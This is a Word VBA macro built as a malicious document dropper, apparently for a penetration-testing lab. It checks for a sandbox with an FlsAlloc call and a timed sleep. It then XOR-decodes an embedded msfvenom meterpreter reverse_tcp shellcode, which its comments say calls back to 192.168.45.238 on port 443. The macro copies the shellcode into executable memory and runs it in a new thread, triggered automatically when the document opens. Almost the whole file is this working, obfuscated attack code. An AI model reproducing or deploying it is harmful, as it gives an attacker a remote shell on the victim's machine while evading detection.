Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    ' NOTE: Payload requires to be <= 24 line continuations (_) - which is why reverse_tcp is chosen.
    ' msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f csharp 
    ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
    buf = Array(006, 018, 117, 250, 250, 250, 154, 203, 040, 158, 113, 168, 202, 115, 031, 113, 168, 246, 113, 168, 238, 113, 136, 210, 203, _
005, 245, 077, 176, 220, 203, 058, 086, 198, 155, 134, 248, 214, 218, 059, 053, 247, 251, 061, 179, 143, 021, 168, 113, 168, _
234, 113, 184, 198, 173, 251, 042, 113, 186, 130, 127, 058, 142, 182, 251, 042, 113, 178, 226, 113, 162, 218, 251, 041, 170, _
127, 051, 142, 198, 203, 005, 179, 113, 206, 113, 251, 044, 203, 058, 059, 053, 247, 086, 251, 061, 194, 026, 143, 014, 249, _
135, 002, 193, 135, 222, 143, 026, 162, 113, 162, 222, 251, 041, 156, 113, 246, 177, 113, 162, 230, 251, 041, 113, 254, 113, _
251, 042, 115, 190, 222, 222, 161, 161, 155, 163, 160, 171, 005, 026, 162, 165, 160, 113, 232, 019, 122, 005, 005, 005, 167, _
146, 201, 200, 250, 250, 146, 141, 137, 200, 165, 174, 146, 182, 141, 220, 253, 115, 018, 005, 042, 066, 106, 251, 250, 250, _
211, 062, 174, 170, 146, 211, 122, 145, 250, 005, 047, 144, 240, 146, 058, 082, 215, 020, 146, 248, 250, 251, 065, 115, 028, _
170, 170, 170, 170, 186, 170, 186, 170, 146, 016, 245, 037, 026, 005, 047, 109, 144, 234, 172, 173, 146, 099, 095, 142, 155, _
005, 047, 127, 058, 142, 240, 005, 180, 242, 143, 022, 018, 157, 250, 250, 250, 144, 250, 144, 254, 172, 173, 146, 248, 035, _
050, 165, 005, 047, 121, 002, 250, 132, 204, 113, 204, 144, 186, 146, 250, 234, 250, 250, 172, 144, 250, 146, 162, 094, 169, _
031, 005, 047, 105, 169, 144, 250, 172, 169, 173, 146, 248, 035, 050, 165, 005, 047, 121, 002, 250, 135, 210, 162, 146, 250, _
186, 250, 250, 144, 250, 170, 146, 241, 213, 245, 202, 005, 047, 173, 146, 143, 148, 183, 155, 005, 047, 164, 164, 005, 246, _
222, 245, 127, 138, 005, 005, 005, 019, 097, 005, 005, 005, 251, 057, 211, 060, 143, 059, 057, 065, 026, 231, 208, 240, 146, _
092, 111, 071, 103, 005, 047, 198, 252, 134, 240, 122, 001, 026, 143, 255, 065, 189, 233, 136, 149, 144, 250, 169, 005, 047)
    
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Decode the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
